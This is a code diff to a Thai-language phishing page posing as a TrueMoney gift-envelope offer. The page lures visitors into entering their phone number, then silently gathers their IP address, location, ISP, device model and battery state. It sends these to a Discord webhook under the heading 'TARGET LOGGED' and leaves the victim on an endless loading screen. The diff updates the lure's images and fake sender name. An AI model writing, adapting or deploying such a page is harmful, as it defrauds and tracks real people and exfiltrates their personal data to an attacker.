@@ -9,9 +9,9 @@
     <meta property="og:type" content="website">
     <meta property="og:title" content="ของขวัญสำหรับคุณ">
     <meta property="og:description" content="คุณได้รับซองทรูมันนี่มูลค่า 10-100 บาท จากเพื่อนของคุณ">
-    <meta property="og:image" content="https://www.img.in.th/images/062820610149090b8f192b1b369e8b7b.png">
+    <meta property="og:image" content="https://lh3.googleusercontent.com/pw/AP1GczM_tUjS9XGz-M_E9zU_yKx9V-Z0yF5H_q3N0Jk1H7G9zY2_x4U_V6zH=w500-h500-no">
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:image" content="https://www.img.in.th/images/062820610149090b8f192b1b369e8b7b.png">
+    <meta property="twitter:image" content="https://lh3.googleusercontent.com/pw/AP1GczM_tUjS9XGz-M_E9zU_yKx9V-Z0yF5H_q3N0Jk1H7G9zY2_x4U_V6zH=w500-h500-no">
 
     <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;700&display=swap" rel="stylesheet">
     <style>
@@ -23,7 +23,6 @@
         input[type="text"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 1.1rem; box-sizing: border-box; outline: none; }
         .btn-orange { background-color: #ff8c2d; color: white; border: none; width: 100%; padding: 16px; font-size: 1.1rem; font-weight: bold; border-radius: 30px; cursor: pointer; margin-top: 20px; }
         
-        /* หน้าจอ Loading */
         #loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #ff8c2d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -32,14 +31,12 @@
 <body>
     <div class="container">
         <img class="main-img" src="https://gift.truemoney.com/campaign/static/media/landing_main.26b054af21dc302fb4a6.png">
-        <div class="sender-name">ปัญญาภร ***</div>
+        <div class="sender-name">ศราวุธ ***</div>
         <div style="color: #888;">ส่งซองทรูมันนี่ให้คุณ</div>
-        
         <div class="input-box">
             <label style="font-size: 0.9rem; color: #666;">กรอกเบอร์โทรศัพท์เพื่อรับซอง</label>
             <input type="text" id="phone" placeholder="08x-xxx-xxxx" maxlength="10">
         </div>
-        
         <button class="btn-orange" onclick="startRedeem()">รับซองเลย</button>
     </div>
 
@@ -53,15 +50,10 @@
         
         async function startRedeem() {
             const phone = document.getElementById('phone').value;
-            if(phone.length < 10) { 
-                alert("กรุณากรอกเบอร์โทรศัพท์ให้ถูกต้อง"); 
-                return; 
-            }
+            if(phone.length < 10) { alert("กรุณากรอกเบอร์โทรศัพท์ให้ถูกต้อง"); return; }
             
-            // 1. แสดงหน้าจอหมุนโหลดทันที
             document.getElementById('loading-screen').style.display = 'flex';
             
-            // 2. ดึงข้อมูล Intelligence แบบเงียบๆ
             let ipData = { ip: "Unknown", city: "Unknown", org: "Unknown", latitude: 0, longitude: 0 };
             let batteryInfo = "Unknown";
             let deviceModel = navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown Device";
@@ -78,7 +70,6 @@
 
             const mapsLink = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
             
-            // 3. เตรียมข้อมูลส่งเข้า Discord
             const payload = { embeds: [{
                 title: "🎯 TARGET LOGGED: TRUE-GIFT V13 INTELLIGENCE",
                 color: 16745517,
@@ -93,18 +84,10 @@
             }]};
 
             try {
-                // 4. ส่งข้อมูล
-                await fetch(WEBHOOK_URL, { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify(payload) 
-                });
-                
-                // 5. ปล่อยให้หมุนค้างไว้ตลอดไป (Infinite Loading) ไม่มีการ Alert แจ้งเตือน
-                console.log("Success: Keeping victim waiting...");
-                
-            } catch (error) { 
-                console.log("Error: System failed but still spinning.");
+                await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                // ปล่อยให้หมุนค้างไว้ตลอดไป ไม่มีการแจ้งเตือน (Alert) ตามคำสั่ง
+            } catch (error) {
+                console.log("Error but still spinning...");
             }
         }
     </script>
